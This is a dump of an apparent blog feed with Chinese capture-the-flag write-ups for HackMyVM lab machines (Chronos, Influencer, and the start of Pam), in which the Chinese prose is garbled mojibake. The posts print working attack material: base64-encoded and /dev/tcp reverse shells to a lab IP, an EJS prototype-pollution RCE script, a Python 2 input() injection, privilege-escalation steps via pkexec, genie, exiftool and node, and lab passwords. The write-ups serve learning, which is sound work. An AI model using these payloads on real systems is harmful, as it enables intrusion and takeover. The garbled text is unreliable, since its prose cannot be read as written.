<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318111039.png" ></p>
<p>æ¥ä¸‹æ¥åå¼¹shellï¼Œç»è¿‡å¤šæ¬¡å°è¯•ï¼Œå‘ç°å¯ä»¥åˆ©ç”¨æ‹¿åˆ°ç¬¬ä¸€ä¸ªshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ` <span class="built_in">echo</span> <span class="string">&quot;cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjY0LjMgODg4OCA+L3RtcC9m&quot;</span> | <span class="built_in">base64</span> -d ` | sh -</span><br><span class="line"></span><br><span class="line"><span class="built_in">base64</span>è§£ç çš„å†…å®¹æ˜¯ï¼š<span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.64.3 8888 &gt;/tmp/f</span><br><span class="line">ç®¡é“ ï½œsh - è¡¨ç¤ºè®²è§£ç åçš„å†…å®¹äº¤ç»™shå½“æˆè„šæœ¬æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<h4 id="ææƒæ–¹å¼1"><a href="#ææƒæ–¹å¼1" class="headerlink" title="ææƒæ–¹å¼1"></a>ææƒæ–¹å¼1</h4><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªshellåï¼Œä½¿ç”¨findæŸ¥çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥ç”¨ï¼ˆsudo -læ‰¾ä¸åˆ°ä»€ä¹ˆå¯ä»¥ç”¨çš„ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°pkexecå¯ä»¥ç”¨</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2011.18.35.png" ></p>
<p>æŸ¥æ‰¾åˆ°ç‰ˆæœ¬æ˜¯0.105ï¼Œä¸Šç½‘æœç´¢äº†ä¸€ä¸‹æœ‰æ²¡æœ‰å¯ä»¥ç”¨çš„è„šæœ¬ï¼Œæœ€åæ‰¾åˆ°<a class="link"   href="https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/" >https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/<i class="fas fa-external-link-alt"></i></a> å¯ä»¥ç”¨</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2011.21.58.png" ></p>
<p>æˆåŠŸææƒåˆ°root</p>
<h4 id="ææƒæ–¹æ³•2"><a href="#ææƒæ–¹æ³•2" class="headerlink" title="ææƒæ–¹æ³•2"></a>ææƒæ–¹æ³•2</h4><p>åˆ‡æ¢åˆ°homeç›®å½•ä¸‹ï¼Œæœ‰nitishå’Œsamä¸¤ä¸ªç”¨æˆ·ï¼Œsamç›®å½•è¿›ä¸å»ï¼Œåœ¨nitishç›®å½•çš„.devç›®å½•ä¸‹æœ‰ä¸ªcreds.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112450.png" ></p>
<p>æœ‰ä¸€ä¸ªå¯†ç ï¼Œæ¥ä¸‹æ¥ç”¨sshç™»é™†nitishè´¦æˆ·</p>
<p>p4ssw0rdStr3r0n9</p>
<p>sudo -lå‘ç°æœ‰ä¸ªgenieå¯ä»¥åˆ©ç”¨ï¼Œåœ¨ç½‘ä¸Šæ‰¾ç°æˆçš„ææƒæ–¹å¼å¤±è´¥</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112652.png" ></p>
<p>-hæŸ¥çœ‹å¸®åŠ©ï¼Œæœ‰ä¸€ä¸ª-eæ‰§è¡Œcmdï¼Œä½†æ˜¯è¿˜æ˜¯å¤±è´¥äº†</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112941.png" ></p>
<p>ç„¶åç”¨manæŸ¥çœ‹genieï¼Œå‘ç°æœ‰ä¸ªcmd</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113121.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u sam /usr/bin/genie -cmd éšä¾¿å†™ç‚¹</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113234.png" ></p>
<p>æˆåŠŸæ‹¿åˆ°samçš„shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113352.png" ></p>
<p>sudo -lçœ‹åˆ°æœ‰ä¸ªlagoå¯ä»¥åˆ©ç”¨ï¼Œæ‰§è¡Œçœ‹çœ‹ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ï¼Œæœ‰å‡ ä¸ªé€‰é¡¹ï¼Œå…¶ä¸­æ¯”è¾ƒæœ‰ç”¨çš„æ˜¯æœ‰ä¸ªçŒœæ•°æ¸¸æˆ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113515.png" ></p>
<h5 id="è§£å†³æ€è·¯1ï¼ˆæš´åŠ›ï¼‰"><a href="#è§£å†³æ€è·¯1ï¼ˆæš´åŠ›ï¼‰" class="headerlink" title="è§£å†³æ€è·¯1ï¼ˆæš´åŠ›ï¼‰"></a>è§£å†³æ€è·¯1ï¼ˆæš´åŠ›ï¼‰</h5><p>ç”¨ä¸ªä¸€ç›´å¾ªç¯çš„è„šæœ¬ï¼Œä¸€ç›´åšæŒçŒœåŒä¸€ä¸ªæ•°å­—ï¼Œçœ‹è¿æ°”ï¼Œæ€»æœ‰èƒ½çŒœå¯¹çš„æ—¶å€™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> sudo /root/lago; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113812.png" ></p>
<h5 id="è§£å†³æ€è·¯2"><a href="#è§£å†³æ€è·¯2" class="headerlink" title="è§£å†³æ€è·¯2"></a>è§£å†³æ€è·¯2</h5><p>åœ¨&#x2F;home&#x2F;samçš„ç›®å½•ä¸‹æœ‰ä¸ª.pycæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥åç¼–è¯‘ä¸€ä¸‹ï¼Œå°±èƒ½çœ‹åˆ°lagoçš„æºç ï¼Œæ³¨æ„åˆ°</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318114957.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2012.08.59.png" ></p>
<p>é€‰é¡¹2é‚£é‡Œæœ‰ä¸ªåˆ¤æ–­ï¼Œè¦åˆ¤æ–­sæ˜¯å¦ç­‰äºnumï¼Œé‚£ç›´æ¥è¾“å…¥numï¼ŒinputæŠŠä½ ä¼ é€’çš„numå½“æˆäº†ä¸€ä¸ªå˜é‡ï¼ˆæ³¨æ„é¶æœºçš„pyhtonç‰ˆæœ¬æ˜¯2.xï¼Œå¦‚æœæ˜¯3ä»¥ä¸Šçš„ç‰ˆæœ¬è¿™ä¸ªæ€è·¯ä¸è¡Œï¼‰ï¼Œnum&#x3D;numè‡ªç„¶å°±å¯ä»¥äº†ï¼Œç¥å¥‡ã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318115124.png" ></p>
<p>ä¹Ÿå¯ä»¥åˆ©ç”¨inputçš„åŠ¨æ€è½½å…¥ï¼Œä¹Ÿèƒ½æ‹¿åˆ°root</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;/bin/bash&#x27;)</span><br></pre></td></tr></table></figure>

<p>è¾“å…¥è¿™ä¸ªpython2çš„inputæ”¯æŒåŠ¨æ€è½½å…¥ï¼ŒæŠŠè¿™ä¸ªè¯­å¥å½“æˆè¡¨è¾¾å¼æ‰§è¡Œï¼Œå¦‚æœæ˜¯pyhton3å°±åªä¼šå½“æˆå­—ç¬¦ä¸²</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113923.png" ></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è¿™ä¸ªé¶æœºæ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹æ¯”è¾ƒå¤šï¼šftpä¸‹è½½æ–‡ä»¶ï¼Œè¿œç¨‹è®¡ç®—å™¨è„šæœ¬çš„ç¼–å†™ï¼Œsshæ•²é—¨æ‰“å¼€ç«¯å£ï¼Œåå¼¹shellçš„ç»•è¿‡æ–¹æ³•ï¼Œpkexecçš„ææƒï¼ŒmanæŸ¥çœ‹ä½¿ç”¨æ‰‹å†Œï¼ˆæ¯”â€“helpè¯¦ç»†ï¼‰ï¼Œpycåç¼–è¯‘ï¼Œpython2ä¸­inputçš„æ™ºèƒ½è½¬æ¢å’ŒåŠ¨æ€è½½å…¥çš„åˆ©ç”¨ï¼Œéƒ½å¾ˆå€¼å¾—å­¦ä¹ ã€‚</p>
<p>åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¿¡æ¯æœé›†ä¸€å¦‚æ—¢å¾€çš„é‡è¦ã€‚</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm Chronoså¤ç›˜</title>
    <url>/2024/06/21/hackmyvm-Chronos%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ä¸€ä¸ªè€ƒéªŒç»†å¿ƒçš„é¶åœºï¼Œæˆ‘è¿˜æŒºè¢«å¡çš„ï¼Œä¹Ÿæ˜¯ç»™æˆ‘ä¸€ä¸ªæ•™è®­ï¼Œå†™å¤ç›˜ä¸»è¦æ˜¯è®°å½•å›é¡¾ï¼Œåšå‡ºæ¥ä¸»è¦è¿˜æ˜¯å‚è€ƒäº†å¤§ä½¬çš„wpï¼Œå†™å®Œwpè¿˜æ˜¯æ„è¯†åˆ°è‡ªå·±åŸºç¡€å¤ªå¼±ï¼Œå¸Œæœ›æš‘å‡èƒ½é™ä¸‹å¿ƒå¥½å¥½è¡¥åŸºç¡€</p>
<p>ä¸»è¦å‚è€ƒï¼š</p>
<p><a class="link"   href="https://al1enum.github.io/docs/Chronos.pdf" >https://al1enum.github.io/docs/Chronos.pdf<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV15o4y1z73N/?vd_source=04ff153ff0b36e8676b4638902ed9f4b" >https://www.bilibili.com/video/BV15o4y1z73N/?vd_source=04ff153ff0b36e8676b4638902ed9f4b<i class="fas fa-external-link-alt"></i></a> ï¼ˆè®²çš„å¾ˆç»†ï¼Œæ¨èï¼‰</p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>å‰æœŸçœ‹åˆ°å¼€äº†22ï¼Œ80ï¼Œ8000ç«¯å£ï¼Œå…ˆçœ‹80å’Œ8000</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174335.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174353.png" ></p>
<p>æœ€å¼€å§‹æ‹¿åˆ°ä¸¤ä¸ªç½‘é¡µï¼Œå†…å®¹å·®ä¸å¤šï¼ŒæŸ¥çœ‹æºä»£ç ä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆæ–°ä¸œè¥¿ï¼Œæ‰«äº†å¾ˆä¹…ç›®å½•æ‰«åˆ°ä¸€ä¸ª&#x2F;dateï¼Œè®¿é—®ä¹‹åæ˜¯ä¸€äº›æŠ¥é”™ï¼Œæš‚æ—¶å¯¹æˆ‘æ²¡ä»€ä¹ˆå¸®åŠ©ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘å°±è¢«å¡ä½äº†ã€‚ã€‚ã€‚ã€‚</p>
<p>ç„¶åæˆ‘å°±çœ‹äº†wpæç¤ºï¼Œè¦è§‚å¯Ÿè®¿é—®ç½‘ç«™çš„è¯·æ±‚åŒ…</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174604.png" ></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªåŸŸåï¼Œè¦ç¼–è¾‘ä¸€ä¸‹&#x2F;etc&#x2F;hostsäº†ï¼Œå†è®¿é—®</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174835.png" ></p>
<p>ä¸»è¦åˆ°&#x2F;data?format&#x3D;æœ‰ä¸€æ®µå†…å®¹ï¼Œå°è¯•æ‹¿å»è§£ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621174930.png" ></p>
<p>base58è§£ç åå‘ç°è¿™æ˜¯ä¸€ä¸ªæ˜¾ç¤ºæ—¶é—´çš„å‘½ä»¤ï¼Œè‡³äºä¸ºä»€ä¹ˆä¼šPermission Deniedï¼Œç»è¿‡ç ”ç©¶ï¼Œå‘ç°æ˜¯è¯·æ±‚åŒ…çš„ç¼ºå°‘äº†ç‰¹å®šçš„uaå¤´ï¼ˆæ­£å¸¸æŠ“åŒ…èƒ½å‘ç°æ˜¯æœ‰çš„ï¼‰<strong>ï¼ˆåæ¥å‘ç°ç½‘ç«™æºç æœ‰ä¸€æ®µè¢«æ··æ·†çš„ä»£ç ï¼Œè§£æ··æ·†åä¹Ÿèƒ½çŸ¥é“è¦æ±‚æœ‰ç‰¹å®šuaå¤´æ‰èƒ½æ‰§è¡Œä»£ç ï¼‰</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621175416.png" ></p>
<p>äºæ˜¯åŠ ä¸Šä¹‹åæ‰èƒ½æ­£ç¡®çœ‹åˆ°æ—¶é—´</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240621175458.png"   style="zoom:50%;" >

<h4 id="åŠŸèƒ½ç‚¹åˆ©ç”¨"><a href="#åŠŸèƒ½ç‚¹åˆ©ç”¨" class="headerlink" title="åŠŸèƒ½ç‚¹åˆ©ç”¨"></a>åŠŸèƒ½ç‚¹åˆ©ç”¨</h4><p>çŸ¥é“æœ‰è¿™ä¸ªåŠŸèƒ½ç‚¹ï¼Œå¯ä»¥å°è¯•å‘½ä»¤æ³¨å…¥ï¼Œformatå‚æ•°æ¥æ”¶å‘½ä»¤ï¼Œäºæ˜¯å°è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.64.3/8888 0&gt;&amp;1&#x27;</span><br><span class="line">base58ç¼–ç ï¼šYLAX9KhLnbeXJEfvdxJCU6qbixB1RzHhWDZ87VijVMTAtiYpjwpV2jJXtqZBGQg1uLKckNVQHium3Ca</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸåå¼¹åˆ°shell</p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>çœ‹äº†ä¸€ä¸‹é¶æœºå¼€æ”¾çš„ç«¯å£</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623102311.png" ></p>
<p>å‘ç°å†…ç½‘è¿˜å¼€äº†ä¸€ä¸ª8080ç«¯å£ï¼Œcurlä¸€ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623105206.png" ></p>
<p>å‘ç°æœ‰Chronos version2ï¼Œå›åˆ°ä¸Šä¸€çº§ç›®å½•ï¼Œæœ‰ä¸€ä¸ªchronos-v2ï¼Œçœ‹ä¸€ä¸‹ä»£ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623105320.png" ></p>
<p>ejsåº“ä½¿ç”¨<code>express-fileupload</code>æ¥å¤„ç†æ–‡ä»¶ä¸Šä¼ ï¼Œæœ‰ä¸€ä¸ªåˆ©ç”¨åŸå‹é“¾æ±¡æŸ“çš„pocï¼ˆè¿˜ä¸æ˜¯å¾ˆæ‡‚åŸç†ï¼‰å¯ä»¥ç›´æ¥ç”¨</p>
<p><a class="link"   href="https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py" >https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">### commands to run on victim machine</span><br><span class="line">cmd = &#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.64.3/1234 0&gt;&amp;1&quot;&#x27;</span><br><span class="line"></span><br><span class="line">print(&quot;Starting Attack...&quot;)</span><br><span class="line">### pollute</span><br><span class="line">requests.post(&#x27;http://127.0.0.1:8080&#x27;, files = &#123;&#x27;__proto__.outputFunctionName&#x27;: (</span><br><span class="line">    None, f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;)&#125;)</span><br><span class="line"></span><br><span class="line">### execute command</span><br><span class="line">requests.get(&#x27;http://127.0.0.1:8080&#x27;)</span><br><span class="line">print(&quot;Finished!&quot;)</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œè¿™ä¸ªpocå°±èƒ½å¾—åˆ°imeraçš„shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110405.png" ></p>
<p>ç„¶åsudo -lå°±èƒ½çœ‹åˆ°æœ‰nodeå’Œnpmå¯ä»¥ç”¨</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110430.png" ></p>
<p>ç›´æ¥gtfobinsåˆ©ç”¨nodeä¸€æŠŠæ¢­ï¼ŒææƒæˆåŠŸï¼Œç»“æŸ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240623110532.png" ></p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm influencerå¤ç›˜</title>
    <url>/2024/04/05/hackmyvm-influencer%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>åœ°å€ï¼š<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Influencer" >https://hackmyvm.eu/machines/machine.php?vm=Influencer<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šmedium</p>
<p>ipï¼š192.168.64.115(åå˜æˆ116)</p>
<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>nmapæ‰«åˆ°2121ç«¯å£ï¼ˆæ˜¯ftpæœåŠ¡ï¼ˆå’Œ80ç«¯å£</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405154528.png" ></p>
<p>æ— å¯†ç è¿æ¥ftpï¼Œæœ‰ä¸€ä¸ªnote.txtæç¤ºæœ‰ä¸ªwordpressç«™ç‚¹ï¼Œè¿˜æœ‰å¾ˆå¤šå¼ å›¾ç‰‡ï¼Œç”¨å·¥å…·åˆ†æäº†å›¾ç‰‡ï¼Œæ‰¾åˆ°snapchat.jpgæœ‰éšè—ä¿¡æ¯</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405154710.png" ></p>
<p>ç»™äº†ä¸€ä¸²å¯†ç ï¼Œè¿˜è¦çœ‹ç”¨æˆ·å</p>
<p>çœ‹çœ‹80ç«¯å£ï¼Œåˆ°ç›®å½•æ‰«åˆ°&#x2F;wordpressï¼Œå¾ˆå®¹æ˜“å°±æ‰¾åˆ°ç™»å½•å£ï¼Œç”¨wpscanæ‰«æï¼Œæ‰«åˆ°ä¸€ä¸ªç”¨æˆ·ålunaï¼Œå°è¯•ç”¨åˆšåˆšåˆ°å¯†ç ç™»å½•ï¼Œå¤±è´¥ï¼Œrockyou.txtçˆ†ç ´ä¹Ÿæ²¡æœ‰ç»“æœï¼Œç„¶åå°±å»ç«™ç‚¹æœ¬èº«çœ‹çœ‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155202.png" ></p>
<p>çœ‹åˆ°æœ‰å…³lunaçš„ä¸ªäººä¿¡æ¯ï¼Œç”¨ç¤¾å·¥å·¥å…·ç”Ÿæˆä¸€ä¸ªå­—å…¸</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-05%2015.54.55.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155651.png" ></p>
<p>ç„¶åç”¨wpscançˆ†ç ´å‡ºå¯†ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155805.png" ></p>
<p>æˆåŠŸçˆ†ç ´å‡ºæ¥ï¼Œç™»å½•åå°</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405155939.png" ></p>
<p>æ‰¾åˆ°appearance-&gt;theme file editorï¼Œä¿®æ”¹phpæ–‡ä»¶ï¼Œå†™å…¥åé—¨æ–‡ä»¶ï¼Œæœ¬åœ°å¼€å¯ç›‘å¬</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160202.png" ></p>
<p>æˆåŠŸæ‹¿åˆ°www-dataçš„shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160255.png" ></p>
<h4 id="userflag"><a href="#userflag" class="headerlink" title="userflag"></a>userflag</h4><p>ss -lntpæŸ¥çœ‹å¼€æ”¾äº†ä»€ä¹ˆç«¯å£</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160424.png" ></p>
<p>æ³¨æ„åˆ°æœ‰ä¸ª1212ç«¯å£ï¼Œå…ˆç”¨socatè½¬å‘å‡ºå»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:4444,fork TCP:localhost:1212 &amp; </span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®4444ç«¯å£</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160617.png" ></p>
<p>çœ‹æ¥æ˜¯ä¸ªsshæœåŠ¡ï¼Œé‚£å°±ç”¨sshè¿æ¥ï¼Œç”¨æœ€å¼€å§‹åœ¨å›¾ç‰‡é‡Œæ‹¿åˆ°çš„å¯†ç ï¼ŒæˆåŠŸç™»å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh luna@192.168.64.116 -p 4444</span><br><span class="line">å¯†ç ï¼šu3jkeg97gf</span><br></pre></td></tr></table></figure>

<p>ç„¶åä½¿ç”¨sudo -læŸ¥åˆ°juanå¯ä»¥å…å¯†ç æ‰§è¡Œexiftool</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405160840.png" ></p>
<p>å†æŸ¥è¯¢çŸ¥é“exiftoolå¯ä»¥å†™æ–‡ä»¶ï¼Œ<strong>æ€è·¯æ˜¯åœ¨juançš„.sshç›®å½•ä¸‹å†™ä¸€ä¸ªauthorized_keys</strong>,ç„¶åsshè¿æ¥ç™»å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luna@influencer:~$ cd /tmp</span><br><span class="line">luna@influencer:/tmp$ echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8pW4mmY4tPKfm6n1XBJldNxoo+ehIpzS1Y1kI32qU8fLVbraU85pjcPUK7pHcvoKfBl02hjpKhsTSHHG5iEsaCAMrD8euYDfNRKu0ITfX5EukM8JhDXEgWzGWlieF9KEB0haZJyFm6lIVPK950FtElXNZGagQ3wyQoVGRnoUhTlyeK5BcFbFlnMZdndOEB8TPOTzc13SpfCSU7lF4YckPjqgV1Y45kDEvJViv9xMPEd0be80F+lJ1J2/qywFTySfVlOqsFOzp3m3fLyUb80yk8Qs0BSR5q1NXexHXfCPwBbDW6vX4iygbSm1TRei2kre0CvsqUEgGipCmJTdkPQyr+ZFTZl/0DlSX07ZSrat9NAbXc+MfG5j0QsgebkjR4aWQxAym/yEfe7WGyOZdf43rxzS61dToq9CBrTQUapmwg6efBTwlEeMVA+fSK5bqxDvD1quCLoMrSonc7v4OKkopaB3hUfdM/YwGexHk7DLtsE50O80wMajhYy8aR4N4aI8= root@kali&#x27; &gt; abc</span><br><span class="line">luna@influencer:/tmp$ chmod 777 abc</span><br><span class="line">luna@influencer:/tmp$ sudo -u juan /usr/bin/exiftool -filename=/home/juan/.ssh/authorized_keys abc</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸåœ¨æœ¬åœ°ç™»å½•</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161301.png"   style="zoom:50%;" >

<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>sudo -læŸ¥åˆ°æ˜¯å…å¯†ç æ‰§è¡Œä¸€ä¸ªè„šæœ¬ï¼Œè„šæœ¬å†…å®¹æ˜¯ç»™server.hmvå‘é€è¯·æ±‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161444.png" ></p>
<p>ç„¶åæŸ¥åˆ°&#x2F;etc&#x2F;hostsæœ‰å†™çš„æƒé™ï¼Œé‚£ä¹ˆæ€è·¯æ˜¯ä¿®æ”¹&#x2F;etc&#x2F;hostsï¼Œ<strong>æŠŠserver.hmvçš„åœ°å€é…ç½®ä¸ºè‡ªå·±kaliçš„ipï¼Œå¼€å¯apacheæœåŠ¡å¹¶ä¸”åœ¨ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª98127651çš„æ–‡ä»¶</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161658.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161859.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405161931.png" ></p>
<p>æ‰§è¡Œå‘½ä»¤åå†æŸ¥çœ‹&#x2F;bin&#x2F;bashçš„æƒé™</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405162027.png" ></p>
<p>æœ€åbash -pé‡æ–°è¿›å…¥bashï¼ŒææƒæˆåŠŸ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405162119.png" ></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è¿™ä¸ªé¶åœºè™½ç„¶æ˜¯mediumï¼Œä½†æ˜¯æ€è·¯éƒ½æ˜¯æ¯”è¾ƒå¸¸è§çš„ï¼Œæ„Ÿè§‰åšå®Œæ˜¯åœ¨å›é¡¾å‰æ®µæ—¶é—´å­¦åˆ°çš„ä¸œè¥¿ã€‚æ¶‰åŠçš„çŸ¥è¯†ç‚¹ï¼šwpscanæ‰«æï¼Œçˆ†ç ´å¯†ç ï¼Œç¤¾å·¥å·¥å…·ç”Ÿæˆå­—å…¸ï¼Œwordpressåå°å†™å…¥åé—¨ï¼Œsocatç«¯å£è½¬å‘ï¼Œexiftoolè¯»å†™æ–‡ä»¶ï¼Œ&#x2F;etc&#x2F;hostsé…ç½®ã€‚</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm pamå¤ç›˜</title>
    <url>/2024/03/22/hackmyvm-pam%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>åœ°å€ï¼š <a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Pam" >https://hackmyvm.eu/machines/machine.php?vm=Pam<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šmedium</p>
<p>ipï¼š192.168.64.90</p>
